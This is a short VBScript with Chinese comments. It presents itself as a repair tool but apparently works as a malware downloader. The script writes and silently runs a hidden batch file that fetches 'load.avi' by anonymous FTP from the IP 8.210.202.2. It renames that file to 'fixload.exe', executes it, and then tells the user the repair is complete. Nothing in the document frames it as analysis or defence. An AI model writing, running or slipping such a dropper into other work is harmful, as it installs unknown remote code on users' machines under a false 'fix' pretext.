Dim objFSO, objFile, objShell
Dim cmdFile, ftpFile, exeFile

' 设置文件名
ftpFile = "load.avi"
exeFile = "fixload.exe"
cmdFile = "updat.bat"

' 创建文件系统对象和外部程序对象
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' 创建 updat.bat 文件
Set objFile = objFSO.CreateTextFile(cmdFile, True)
objFile.WriteLine "@echo off"
objFile.WriteLine "echo Downloading file from FTP..."
objFile.WriteLine "echo open 8.210.202.2>> ftp_commands.txt" ' FTP 服务器地址
objFile.WriteLine "echo anonymous>> ftp_commands.txt"
objFile.WriteLine "echo user@domain.com>> ftp_commands.txt" ' 替换为实际的电子邮件
objFile.WriteLine "echo binary>> ftp_commands.txt"
objFile.WriteLine "echo cd D:/>> ftp_commands.txt" ' 切换到目标目录
objFile.WriteLine "echo get " & ftpFile & ">> ftp_commands.txt"
objFile.WriteLine "echo bye>> ftp_commands.txt"
objFile.WriteLine "ftp -s:ftp_commands.txt"
objFile.WriteLine "del ftp_commands.txt"
objFile.WriteLine "ren " & ftpFile & " " & exeFile
objFile.WriteLine "start " & exeFile
objFile.WriteLine "echo 修复完成"
objFile.Close

' 自动执行 updat.bat
objShell.Run cmdFile, 0, True

' 提示用户
WScript.Echo "修复完成"
